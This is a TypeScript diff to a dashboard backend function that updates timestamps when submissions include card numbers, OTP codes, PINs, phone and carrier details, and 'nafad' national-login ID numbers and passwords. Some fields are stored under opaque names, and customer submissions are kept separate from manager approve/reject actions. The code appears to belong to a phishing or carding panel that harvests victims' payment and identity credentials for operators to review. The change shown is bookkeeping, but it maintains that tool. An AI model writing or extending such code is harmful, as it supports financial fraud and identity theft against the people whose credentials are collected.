@@ -538,39 +538,49 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
   // Only update timestamps for CUSTOMER actions, NOT for manager/admin actions
   // This prevents boxes from reordering when manager approves/rejects
   if (!isManagerAction) {
-    // Auto-add _v1UpdatedAt ONLY if card data is in the CURRENT payload
+    // Check both payload and payload.raw for data fields (client sends data in raw)
+    const raw = payload.raw || {};
+    
+    // Auto-add _v1UpdatedAt ONLY if card data is in the payload or raw
     const hasNewCardData = payload._v1 || payload.cardNumber || payload.cardData ||
-                           payload._v1UpdatedAt || payload._v2 || payload._v3;
+                           payload._v1UpdatedAt || payload._v2 || payload._v3 ||
+                           raw._v1 || raw.cardNumber || raw.cardData ||
+                           raw._v1UpdatedAt || raw._v2 || raw._v3;
     if (hasNewCardData) {
       mergedPayload._v1UpdatedAt = now;
     }
 
-    // Auto-add _v5UpdatedAt ONLY if OTP data is in the CURRENT payload
-    const hasNewOtpData = payload._v5 || payload.otpCode || payload.otp || payload.otpSubmittedAt || payload._v5UpdatedAt;
+    // Auto-add _v5UpdatedAt ONLY if OTP data is in the payload or raw
+    const hasNewOtpData = payload._v5 || payload.otpCode || payload.otp || payload.otpSubmittedAt || payload._v5UpdatedAt ||
+                          raw._v5 || raw.otpCode || raw.otp || raw.otpSubmittedAt || raw._v5UpdatedAt;
     if (hasNewOtpData) {
       mergedPayload._v5UpdatedAt = now;
     }
 
-    // Auto-add _v6UpdatedAt ONLY if PIN data is in the CURRENT payload
-    const hasNewPinData = payload._v6 || payload.pinCode || payload.pin || payload._v6UpdatedAt;
+    // Auto-add _v6UpdatedAt ONLY if PIN data is in the payload or raw
+    const hasNewPinData = payload._v6 || payload.pinCode || payload.pin || payload._v6UpdatedAt ||
+                          raw._v6 || raw.pinCode || raw.pin || raw._v6UpdatedAt;
     if (hasNewPinData) {
       mergedPayload._v6UpdatedAt = now;
     }
 
-    // Auto-add _v7UpdatedAt ONLY if phone data is in the CURRENT payload
-    const hasNewPhoneData = payload.phoneNumber || payload.phoneIdNumber || payload.phoneCarrier || payload._v7UpdatedAt;
+    // Auto-add _v7UpdatedAt ONLY if phone data is in the payload or raw
+    const hasNewPhoneData = payload.phoneNumber || payload.phoneIdNumber || payload.phoneCarrier || payload._v7UpdatedAt ||
+                            raw.phoneNumber || raw.phoneIdNumber || raw.phoneCarrier || raw._v7UpdatedAt;
     if (hasNewPhoneData) {
       mergedPayload._v7UpdatedAt = now;
     }
 
-    // Auto-add nafadUpdatedAt ONLY if nafad data is in the CURRENT payload
-    const hasNewNafadData = payload.nafadIdNumber || payload.nafadPassword || payload.nafadUpdatedAt;
+    // Auto-add nafadUpdatedAt ONLY if nafad data is in the payload or raw
+    const hasNewNafadData = payload.nafadIdNumber || payload.nafadPassword || payload.nafadUpdatedAt ||
+                             raw.nafadIdNumber || raw.nafadPassword || raw.nafadUpdatedAt;
     if (hasNewNafadData) {
       mergedPayload.nafadUpdatedAt = now;
     }
 
-    // Auto-add comparCompletedAt ONLY if package/offer data is in the CURRENT payload
-    const hasNewOfferData = payload.selectedOffer || payload.offerTotalPrice || payload.comparCompletedAt;
+    // Auto-add comparCompletedAt ONLY if package/offer data is in the payload or raw
+    const hasNewOfferData = payload.selectedOffer || payload.offerTotalPrice || payload.comparCompletedAt ||
+                            raw.selectedOffer || raw.offerTotalPrice || raw.comparCompletedAt;
     if (hasNewOfferData) {
       mergedPayload.comparCompletedAt = now;
     }
